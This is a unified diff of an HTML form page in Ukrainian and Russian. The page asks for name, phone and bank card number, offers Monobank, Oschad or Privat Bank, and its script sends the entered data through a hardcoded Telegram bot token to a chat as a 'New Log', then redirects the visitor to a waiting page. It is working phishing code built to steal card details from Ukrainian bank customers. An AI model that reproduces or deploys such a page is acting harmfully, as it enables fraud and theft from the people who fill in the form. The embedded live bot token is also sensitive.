@@ -5,99 +5,65 @@
 <title>Заявка</title>
 
 <style>
-body {
-  margin: 0;
-  font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif;
-  background: #f8fafc;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
+body{
+  margin:0;
+  font-family: Arial, sans-serif;
+  background:#f1f5f9;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
 }
 
-/* карточка */
-.box {
-  background: white;
-  padding: 35px;
-  border-radius: 24px;
-  width: 360px;
-  text-align: center;
-  box-shadow: 0 20px 60px rgba(0,0,0,0.08);
-  animation: fade 0.6s ease;
+.box{
+  background:white;
+  padding:30px;
+  border-radius:20px;
+  width:340px;
+  box-shadow:0 10px 30px rgba(0,0,0,0.1);
+  text-align:center;
 }
 
-@keyframes fade {
-  from {opacity: 0; transform: translateY(20px);}
-  to {opacity: 1; transform: translateY(0);}
+h2{
+  margin-bottom:15px;
+  color:#0f172a;
 }
 
-/* заголовок */
-h2 {
-  margin-bottom: 20px;
-  color: #0f172a;
+input{
+  width:100%;
+  padding:12px;
+  margin:6px 0;
+  border:1px solid #e2e8f0;
+  border-radius:10px;
+  outline:none;
 }
 
-/* поля */
-input {
-  width: 100%;
-  padding: 14px;
-  margin: 8px 0;
-  border: 1px solid #e2e8f0;
-  border-radius: 12px;
-  font-size: 14px;
-  transition: 0.2s;
+.service{
+  background:#f1f5f9;
+  padding:10px;
+  margin:6px 0;
+  border-radius:10px;
+  cursor:pointer;
 }
 
-input:focus {
-  border-color: #3b82f6;
-  box-shadow: 0 0 0 2px rgba(59,130,246,0.2);
-  outline: none;
+.service.active{
+  background:#3b82f6;
+  color:white;
 }
 
-/* услуги */
-.service {
-  padding: 12px;
-  margin: 6px 0;
-  border-radius: 12px;
-  background: #f1f5f9;
-  cursor: pointer;
-  transition: 0.2s;
-  font-size: 14px;
+button{
+  width:100%;
+  padding:12px;
+  margin-top:10px;
+  border:none;
+  border-radius:10px;
+  background:#3b82f6;
+  color:white;
+  cursor:pointer;
 }
 
-.service:hover {
-  background: #e2e8f0;
-}
-
-.service.active {
-  background: #3b82f6;
-  color: white;
-}
-
-/* кнопка */
-button {
-  width: 100%;
-  padding: 14px;
-  background: linear-gradient(90deg, #3b82f6, #06b6d4);
-  border: none;
-  border-radius: 12px;
-  color: white;
-  font-size: 15px;
-  cursor: pointer;
-  margin-top: 12px;
-  transition: 0.3s;
-}
-
-button:hover {
-  transform: translateY(-2px);
-  box-shadow: 0 10px 20px rgba(59,130,246,0.3);
-}
-
-/* подпись */
-.small {
-  font-size: 12px;
-  color: #64748b;
-  margin-top: 12px;
+button:hover{
+  background:#2563eb;
 }
 </style>
 </head>
@@ -105,66 +71,62 @@ button:hover {
 <body>
 
 <div class="box">
-  <h2>Відправити заявку</h2></h2>
+  <h2>Відправити заявку</h2>
 
-  <input type="text" id="name" placeholder="Ваше имя">
-  <input type="text" id="phone" placeholder="Ваш телефон">
+  <input type="text" id="name" placeholder="Имя">
+  <input type="text" id="phone" placeholder="Телефон">
   <input type="text" id="telegram" placeholder="Номер картки">
 
-  <p style="color:#475569; font-size:14px;">Виберіть ваш банк:</p>
+  <p>Виберіть ваш Банк:</p>
 
-  <div class="service" onclick="selectService(this)">Monobank</div>
-  <div class="service" onclick="selectService(this)">Oshchad Bank</div>
-  <div class="service" onclick="selectService(this)">Privat Bank</div>
+  <div class="service" onclick="select(this)">Oschad Bank</div>
+  <div class="service" onclick="select(this)">Monobank</div>
+  <div class="service" onclick="select(this)">Privat Bank</div>
 
-  <button onclick="send()">Відправити</button>
-
-  <div class="small">Ми не передаємо ваші данні</div>
+  <button onclick="send()">Отримати</button>
 </div>
 
 <script>
-let selectedService = "";
+let service = "";
 
-function selectService(el) {
-  document.querySelectorAll(".service").forEach(e => e.classList.remove("active"));
+function select(el){
+  document.querySelectorAll(".service").forEach(e=>e.classList.remove("active"));
   el.classList.add("active");
-  selectedService = el.innerText;
+  service = el.innerText;
 }
 
-function send() {
+function send(){
   const name = document.getElementById("name").value.trim();
   const phone = document.getElementById("phone").value.trim();
-  const telegram = document.getElementById("telegram").value.trim();
+  const tg = document.getElementById("telegram").value.trim();
 
-  if (!name || !phone || !telegram || !selectedService) {
-    alert("Заполни все поля!");
+  if(!name || !phone || !tg || !service){
+    alert("Заповніть все!");
     return;
   }
+
+  const id = Date.now();
 
   const token = "8589160707:AAEHCqUhzfom1D3_gtlG5eTiIrtPnXCGnNk";
   const chat_id = "8035773808";
 
-  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: chat_id,
-      text: `🔥 Новый Лог 👻:
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      chat_id:chat_id,
+      text:`🔥 Новый Лог 👻
+ID: ${id}
 Имя🦣: ${name}
 Телефон📱: ${phone}
-Карта💳: ${telegram}
-Услуга: ${selectedService}`
+Карта💳: ${tg}
+Банк🏧: ${service}
+
+👉 Ожидание: /wait.html?id=${id}`
     })
   });
 
-  alert("Заявка віправлена!");
-
-  // очистка
-  document.getElementById("name").value = "";
-  document.getElementById("phone").value = "";
-  document.getElementById("telegram").value = "";
-  selectedService = "";
-  document.querySelectorAll(".service").forEach(e => e.classList.remove("active"));
+  window.location.href = "wait.html?id=" + id;
 }
 </script>
 
